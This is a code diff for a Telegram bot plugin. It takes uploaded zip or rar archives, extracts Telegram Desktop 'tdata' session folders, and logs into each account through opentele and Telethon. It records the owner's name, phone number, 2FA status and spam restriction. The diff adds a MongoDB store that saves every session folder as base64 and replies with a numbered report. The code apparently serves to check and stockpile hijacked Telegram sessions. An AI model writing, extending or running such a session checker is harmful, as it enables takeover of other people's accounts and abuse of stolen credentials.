@@ -1,6 +1,6 @@
 from pyromod.exceptions import ListenerTimeout
 from config import Txt, Config
-from .start import db
+#from .start import db
 
 import os
 import zipfile
@@ -139,119 +139,143 @@ import tempfile
 import shutil
 import zipfile
 import rarfile
-
+import base64
 from pyrogram import Client, filters
 from telethon.errors import SessionPasswordNeededError
 from opentele.td import TDesktop
 from opentele.api import UseCurrentSession
+from telethon.errors.rpcerrorlist import PhoneNumberBannedError
+import motor.motor_asyncio
 
+
+
+
+class Database:
+    def __init__(self, uri, database_name):
+        self._client = motor.motor_asyncio.AsyncIOMotorClient(uri)
+        self.db = self._client[database_name]
+        self.col = self.db.used
+
+    async def get_next_account_num(self):
+        """Return next unique account number"""
+        last = await self.col.find_one(sort=[("account_num", -1)])
+        if not last:
+            return 1
+        return last["account_num"] + 1
+
+    async def save_account(self, user_id, account_num, info, tdata_bytes):
+        """
+        Save account info + tdata in MongoDB
+        """
+        doc = {
+            "_id": user_id,   # unique by Telegram user_id
+            "account_num": account_num,
+            "name": info.get("name", "?"),
+            "phone": info.get("phone", "?"),
+            "twofa": info.get("twofa", "?"),
+            "spam": info.get("spam", "?"),
+            "tdata": base64.b64encode(tdata_bytes).decode("utf-8"),
+        }
+        await self.col.update_one({"_id": user_id}, {"$set": doc}, upsert=True)
+
+    async def total_users_count(self):
+        return await self.col.count_documents({})
+
+
+db = Database(Config.DB_URL, Config.DB_NAME)
 
 
 @Client.on_message(filters.document)
 async def handle_archive(client, message):
-    tempdir = tempfile.mkdtemp()
-    results = []
+    temp_dir = tempfile.mkdtemp()
+    zip_path = await message.download(file_name=os.path.join(temp_dir, message.document.file_name))
+    await message.reply("📥 Download complete. Extracting...")
+
+    # Extract contents
     try:
-        # --- Step 1: Download
-        await message.reply("📥 Downloading file...")
-        file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
-        await message.reply(f"✅ File downloaded: `{file_path}`")
-
-        extract_dir = os.path.join(tempdir, "extracted")
-        os.makedirs(extract_dir, exist_ok=True)
-
-        # --- Step 2: Try extracting as ZIP, else as RAR
-        extracted_ok = False
-        try:
-            with zipfile.ZipFile(file_path, "r") as zip_ref:
-                zip_ref.extractall(extract_dir)
-            await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")
-            extracted_ok = True
-        except Exception as e_zip:
-            try:
-                with rarfile.RarFile(file_path, "r") as rar_ref:
-                    rar_ref.extractall(extract_dir)
-                await message.reply(f"📦 RAR extracted to: `{extract_dir}`")
-                extracted_ok = True
-            except Exception as e_rar:
-                return await message.reply(
-                    f"❌ Not a valid ZIP or RAR.\n"
-                    f"ZIP error: {e_zip}\nRAR error: {e_rar}"
-                )
-
-        # --- Step 3: List contents
-        extracted = []
-        for root, dirs, files in os.walk(extract_dir):
-            for d in dirs:
-                extracted.append(f"[DIR] {os.path.join(root, d)}")
-            for f in files:
-                extracted.append(f"[FILE] {os.path.join(root, f)} ({os.path.getsize(os.path.join(root, f))} B)")
-        if extracted:
-            await message.reply("📂 Extracted contents:\n" + "\n".join(extracted[:50]))
+        if zip_path.lower().endswith(".zip"):
+            with zipfile.ZipFile(zip_path, "r") as zip_ref:
+                zip_ref.extractall(temp_dir)
+        elif zip_path.lower().endswith(".rar"):
+            with rarfile.RarFile(zip_path, "r") as rar_ref:
+                rar_ref.extractall(temp_dir)
         else:
-            await message.reply("⚠️ Archive extracted but appears empty.")
-
-        # --- Step 4: Search for tdata folders (and inner .rar)
-        tdata_paths = []
-        for root, dirs, files in os.walk(extract_dir):
-            if "tdata" in dirs:
-                tdata_paths.append(os.path.join(root, "tdata"))
-
-            for f in files:
-                if f.lower().endswith(".rar"):
-                    rar_path = os.path.join(root, f)
-                    try:
-                        rar_extract_dir = os.path.join(root, "rar_extracted")
-                        os.makedirs(rar_extract_dir, exist_ok=True)
-                        with rarfile.RarFile(rar_path, "r") as rf:
-                            rf.extractall(rar_extract_dir)
-                        for r2, d2, f2 in os.walk(rar_extract_dir):
-                            if "tdata" in d2:
-                                tdata_paths.append(os.path.join(r2, "tdata"))
-                    except Exception as e:
-                        results.append(f"⚠️ Failed to extract inner rar {f}: {e}")
-
-        if not tdata_paths:
-            return await message.reply("⚠️ No `tdata` folders detected in this archive.")
-
-        # --- Step 5: Try login with each tdata
-        for idx, tdata_path in enumerate(tdata_paths, 1):
-            await message.reply(f"➡️ Processing tdata #{idx} at `{tdata_path}`")
-            try:
-                tdesk = TDesktop(tdata_path)
-                if not tdesk.isLoaded():
-                    await message.reply("⚠️ Failed to load this tdata (maybe corrupted?).")
-                    continue
-
-                tele_client = await tdesk.ToTelethon(session=f"session_{idx}.session", flag=UseCurrentSession)
-                await tele_client.connect()
-
-                if not await tele_client.is_user_authorized():
-                    await message.reply("⚠️ Client not authorized (needs login / 2FA).")
-                    continue
-
-                me = await tele_client.get_me()
-                await message.reply(f"✅ Logged in as: **{me.first_name}** (ID: `{me.id}`)")
-
-                try:
-                    await tele_client.PrintSessions()
-                except Exception as e:
-                    await message.reply(f"⚠️ Could not print sessions: `{e}`")
-
-                await tele_client.disconnect()
-
-            except SessionPasswordNeededError:
-                await message.reply("❌ This account requires 2FA password.")
-            except Exception as e:
-                await message.reply(f"❌ Error during login: {e}")
-
+            await message.reply("❌ Unsupported file type. Only zip/rar allowed.")
+            return
     except Exception as e:
-        await message.reply(f"❌ Top-level error: {e}")
-    finally:
+        await message.reply(f"❌ Failed to extract archive: {e}")
+        return
+
+    # Look for tdata folders
+    tdata_paths = []
+    for root, dirs, files in os.walk(temp_dir):
+        if "tdata" in dirs:
+            tdata_paths.append(os.path.join(root, "tdata"))
+
+    if not tdata_paths:
+        await message.reply("⚠️ No tdata folders detected in archive.")
+        return
+
+    results = []
+    account_num = 1
+    for tdata_path in tdata_paths:
         try:
-            shutil.rmtree(tempdir)
-        except:
-            pass
+            tdesk = TDesktop(tdata_path)
+            if not tdesk.isLoaded():
+                results.append(f"#{account_num} ⚠️ Failed to load tdata")
+                continue
+
+            tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
+            await tele_client.connect()
+
+            if not await tele_client.is_user_authorized():
+                results.append(f"#{account_num} ❌ Not authorized (needs login/2FA).")
+                continue
+
+            me = await tele_client.get_me()
+            info = {
+                "name": me.first_name or "?",
+                "phone": me.phone or "?",
+                "twofa": tdesk.HasPassword,
+                "spam": getattr(me, "restricted", False),
+            }
+
+            # Save in Mongo
+            tdata_bytes = shutil.make_archive(tdata_path, "zip", tdata_path)
+            with open(tdata_bytes, "rb") as f:
+                archive_bytes = f.read()
+            acc_num = await db.get_next_account_num()
+            await db.save_account(me.id, acc_num, info, archive_bytes)
+
+            results.append(
+                f"#{acc_num}\n"
+                f"Account Name: {info['name']}\n"
+                f"Phone Number: {info['phone']}\n"
+                f"2FA enabled: {info['twofa']}\n"
+                f"Spam Mute: {info['spam']}\n"
+            )
+
+            await tele_client.disconnect()
+
+        except SessionPasswordNeededError:
+            results.append(f"#{account_num} ❌ Requires 2FA password.")
+        except PhoneNumberBannedError:
+            results.append(f"#{account_num} 🚫 BANNED number.")
+        except Exception as e:
+            results.append(f"#{account_num} ❌ Error: {str(e)}")
+
+        account_num += 1
+
+    # Final report
+    report_text = "📑 Final Report:\n\n" + "\n".join(results)
+    report_path = os.path.join(temp_dir, "report.txt")
+    with open(report_path, "w") as f:
+        f.write(report_text)
+
+    await message.reply_document(report_path, caption="✅ Report generated")
+
+    # Cleanup
+    shutil.rmtree(temp_dir, ignore_errors=True)
 
 
 
